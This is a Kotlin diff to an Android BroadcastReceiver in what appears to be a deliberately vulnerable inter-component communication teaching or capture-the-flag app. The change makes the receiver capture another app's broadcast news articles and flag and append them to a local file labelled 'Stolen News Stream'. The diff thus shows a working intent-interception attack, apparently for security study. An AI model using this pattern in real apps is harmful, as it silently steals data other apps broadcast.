@@ -3,23 +3,35 @@ package uk.ac.swansea.dascalu.dvmicc.call_logger.icc
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
-import com.dfl.newsapi.model.ArticleDto
-import com.google.gson.Gson
-import com.google.gson.reflect.TypeToken
+import java.io.OutputStreamWriter
 
 class CallsBroadcastReceiver : BroadcastReceiver() {
 
     override fun onReceive(context: Context?, intent: Intent) {
         if (intent.extras != null) {
             val jsonArticles = intent.getStringExtra("articles")
-            val newsStreamName = intent.getStringExtra("news_stream_name")
-            val flag = intent.getStringExtra("flag")
+            val newsStreamName: String? = intent.getStringExtra("news_stream_name")
+            val flag: String? = intent.getStringExtra("flag")
 
             if (jsonArticles != null) {
-                val articlesListType = object : TypeToken<List<ArticleDto>>() {}.type
-                val articles = Gson().fromJson<List<ArticleDto>>(jsonArticles, articlesListType)
-
+                if(context != null) {
+                    writeDataToFile(context, jsonArticles, flag, newsStreamName)
+                }
             }
         }
+    }
+
+    private fun writeDataToFile(context: Context, data: String, flag: String?, newsStreamName: String?) {
+        val fileOut = context.openFileOutput("data.txt", Context.MODE_APPEND)
+        val writer = OutputStreamWriter(fileOut)
+
+        if(flag != null) {
+            writer.write("\n\nFlag: $flag\n\n")
+        }
+
+        writer.write("Stolen News Stream: $newsStreamName\n\n")
+        writer.write("$data\n\n")
+
+        writer.close()
     }
 }
